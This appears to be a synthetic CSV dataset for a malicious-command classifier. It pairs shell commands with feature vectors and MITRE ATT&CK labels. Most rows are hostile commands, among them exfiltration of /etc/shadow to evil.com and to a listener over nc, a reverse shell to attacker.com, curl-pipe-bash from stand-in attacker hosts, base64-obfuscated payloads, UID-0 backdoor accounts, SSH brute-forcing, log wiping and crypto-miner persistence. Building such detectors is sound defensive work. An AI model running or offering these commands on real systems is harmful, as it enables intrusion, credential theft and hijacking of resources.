nohup echo 'ZmluZCAvIC1uYW1lICdpZF9yc2EnIDI+L2Rldi9udWxsIDsgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
strings /proc/*/mem | grep -i password,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
ssh  -i  ~/.ssh/stolen_key  root@10.0.0.5  |  history  -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
fping -a -g 192.168.1.0/24 2>/dev/null ; > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5 && sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
arp -a && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
ifconfig -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"bash -c ""cat /tmp/encoded | xxd -r -p | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nohup chmod 644 /etc/hosts &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
$env:cmd  =  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time sudo -u www-data bash && sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time netstat -tulpn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
rm -rf /tmp/* /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""history -c && history -w""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1070_Indicator_Removal'],synthetic
echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
nohup sudo -u www-data bash && sleep 1 &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 0, 0]",['T1136_Create_Account'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
strings /proc/*/mem | grep -i password,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
sudo echo 'R2V0LUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwIEFkbWluaXN0cmF0b3JzICYmIGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'aXAgbGluayBzaG93' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
uname  -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo 'ZWNobyAnKi81ICogKiAqICogY3VybCBodHRwOi8vYzIuY29tL2JlYWNvbicgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
net user /domain ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
sudo reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
nc -e /bin/bash attacker.com 80 ; history -c,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
medusa  -h  10.0.0.1  -u  root  -P  /tmp/passwords.txt  -M  ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
cat /etc/passwd | grep -v nologin | grep -v false,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'Z2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0ICYmIC4vZXhwbG9pdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'Y3JvbnRhYiAtZSAmJiBzbGVlcCAx' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAtdiBub2xvZ2luIHwgZ3JlcCAtdiBmYWxzZQ==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
./CVE-2021-4034 && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'aGVsbG8=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 1]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'YXJwLXNjYW4gLS1sb2NhbG5ldA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
systemctl enable --now malicious.service,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
nohup ln -s /tmp/backdoor.sh /etc/cron.d/system-update && echo done &,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
echo 'Z3JvdXBzICQod2hvYW1pKQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
dmidecode -t system && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo useradd -m -s /bin/bash hacker ; chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
tar  -czf  backup.tar.gz  /home/user,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo 'cm91dGUgLW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAtdiBub2xvZ2luIHwgZ3JlcCAtdiBmYWxzZQ==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
gcc  exploit.c  -o  exploit  &&  ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
echo  'Zm9yIGkgaW4gJChzZXEgMSAyNTQpOyBkbyBwaW5nIC1jMSAtVzEgMTkyLjE2OC4wLiRpICY+L2Rldi9udWxsICYmIGVjaG8gMTkyLjE2OC4wLiRpOyBkb25l'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.6, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo 'bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgOyBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo curl -sL http://evil.com/shell.sh -o /tmp/shell.sh,"[0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
adduser --shell /bin/bash --disabled-password backdoor && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
dmidecode -t system,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""echo 'cGVybCAtZSAnZXZhbCBwYWNrIHEvSCovLCBxLzczNjM3MjY5NzA3NDJlNjU3MDczMmY1MjY1NmQ2Zjc0NjUyZTcwNmU2Ny8n' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""cat /etc/hosts""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
locate wp-config.php,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
cat /proc/version,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo 'PiB+Ly5iYXNoX2hpc3RvcnkgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
nc  -zv  10.0.0.1  1-1000  2>&1  |  grep  succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
for  p  in  $(cat  passwords.txt);  do  sshpass  -p  $p  ssh  root@10.0.0.1  id;  done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
du -sh /var/log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
find  /  -perm  -4000  -type  f  2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time ip route show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"bash -c ""ssh user@192.168.1.10 'ls'""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
(crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
echo 'ZWNobyAnYmFja2Rvb3I6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
echo 'Z2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0ICYmIC4vZXhwbG9pdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo route -n,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
nohup cp /etc/hosts /tmp/hosts.bak &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
locate wp-config.php | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmcli connection show ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time echo 'aXAgbGluayBzaG93' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'Y3VybCAtcyBodHRwOi8vYzIuYXR0YWNrZXIuY29tL2JlYWNvbiB8IGVjaG8gZG9uZQ==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcLi4uJyAtTmFtZSBQZXJzaXN0IC1WYWx1ZSAnQzpccGF5bG9hZC5leGUn' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
time useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.64, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo hello world,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
ip link show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
traceroute google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
nohup echo 'YWRkdXNlciAtLXNoZWxsIC9iaW4vYmFzaCAtLWRpc2FibGVkLXBhc3N3b3JkIGJhY2tkb29y' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
nohup curl -s http://c2.attacker.com/beacon | > /dev/null 2>&1 &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
net user /domain && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
top -bn1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
"bash -c ""ls -la /root /etc /var/www""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
getent passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
"sudo php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
